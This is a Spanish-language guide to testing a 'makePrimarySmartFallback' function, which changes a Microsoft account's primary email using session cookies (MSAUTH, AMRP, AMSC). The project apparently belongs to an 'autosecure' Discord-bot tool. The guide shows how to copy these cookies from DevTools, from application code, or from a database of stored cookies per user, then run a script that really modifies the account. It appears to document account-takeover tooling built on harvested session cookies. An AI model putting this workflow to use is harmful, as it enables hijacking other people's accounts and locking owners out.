# Guía: Prueba Real de makePrimarySmartFallback

## 📋 Requisitos

Para probar el cambio de email principal con una cuenta real necesitas:

1. **MSAUTH Cookie**: Obtenida después de autenticarp una cuenta con Microsoft
2. **AMRP Cookie**: Obtenida en el mismo proceso
3. **Email actual**: El email primario actual de la cuenta
4. **Email nuevo**: El email a establecer como primario

## 🔑 Cómo Obtener las Cookies

### Opción 1: Desde tu aplicación (RECOMENDADO)

Tu aplicación ya tiene código que obtiene estas cookies. Puedes:

```javascript
// En tu código de secure/aliasses.js o similar
const cookiedata = {
    cookies: {
        msauth: host,      // La cookie MSAUTH obtenida
        amrp: amrp,        // La cookie AMRP obtenida
        amsc: amsc         // La cookie AMSC
    }
};

console.log('[DEBUG] MSAUTH:', host.substring(0, 50) + '...');
console.log('[DEBUG] AMRP:', amrp.substring(0, 50) + '...');
```

Luego copialas y úsalas en el test.

### Opción 2: Desde Browser DevTools

1. Abre `account.microsoft.com`
2. Inicia sesión con tu cuenta
3. Abre DevTools (F12)
4. Ve a **Network** → busca una solicitud POST
5. Ve a **Cookies** y busca:
   - `__Host-MSAAUTH` → Cópiala como MSAUTH
   - `amrp` → Cópiala como AMRP
   - `amsc` → Cópiala como AMSC

### Opción 3: Desde tu BD

Si guardas las cookies en la base de datos:

```sql
SELECT msauth, amrp, amsc FROM status WHERE uid = 'TU_UID';
```

## 🧪 Ejecutar el Test Real

```bash
# En PowerShell o terminal
cd c:\Users\IK\Desktop\autosecure
node test-makeprimary-real.js
```

**El script te pedirá:**

```
¿Tienes un MSAUTH cookie? (s/n): s
Ingresa MSAUTH cookie: [AQUI PEGA LA COOKIE]
Ingresa AMRP cookie: [AQUI PEGA LA COOKIE]
Ingresa email actual de la cuenta: tuaccount@outlook.com
Ingresa NUEVO email a establecer como primario: newemail123@outlook.com
```

## ⚠️ Seguridad

- **Las cookies NO se guardan** en archivos
- **Las credenciales NO se logean** en consola (excepto en [DEBUG])
- **El script es solo lectura** - solo ejecuta la función, no modifica código
- **Haz esto en una cuenta de prueba primero**

## ✅ Validar Resultado

Después de ejecutar el test:

1. **Si retorna `true`** → ✅ El email cambió exitosamente
2. **Si retorna `false`** → ❌ Revisa los logs para ver qué falló

**Verifica manualmente:**
- Abre https://account.microsoft.com
- Inicia sesión
- Ve a **Información de la cuenta** → **Tu información**
- Verifica que el email primario sea el nuevo email

## 🔍 Logs Detallados

El script mostrará qué API se usó:

```
[MAKEPRIMARY_SMART] Attempting to change primary email...
[MAKEPRIMARY_SMART] No Bearer Token available, skipping Graph API
[MAKEPRIMARY_SMART] Attempting legacy API method...
[MAKEPRIMARY] Attempting to set newemail@outlook.com as primary...
[MAKEPRIMARY_SMART] ✅ Legacy API succeeded
```

## 📊 Interpretación de Resultados

| Resultado | Significa |
|-----------|-----------|
| `true` | Email cambió exitosamente ✅ |
| `false` | Algo falló, revisa logs |
| Error de sintaxis | Problema en el código |
| Error de red | Problema con Microsoft |

## 🐛 Si Falla

**Causas comunes:**

1. **MSAUTH expirada**: Obtén una nueva
2. **Email ya existe**: Usa un email único
3. **Servicios Microsoft down**: Intenta más tarde
4. **Credenciales inválidas**: Verifica las cookies
5. **Rate limit**: Espera unos minutos

## 💡 Tips

- Usa siempre `+ Date.now()` en emails para hacerlos únicos:
  ```
  newemail${Date.now()}@outlook.com
  ```

- Guarda las cookies en un `.env` local (no en git):
  ```
  MSAUTH=xxxxx
  AMRP=xxxxx
  AMSC=xxxxx
  ```

- Prueba primero con `/secure` en tu bot Discord
- Verifica que funciona antes de usar en producción

## 📝 Notas

- El test **SÍ modifica la cuenta real**
- No es puramente "simulado" después de que ingreses cookies reales
- Úsalo **SOLO en cuentas de prueba** primero
- Guarda un backup del email primario original

---

¿Necesitas ayuda obteniendo las cookies? Pregunta en el chat.
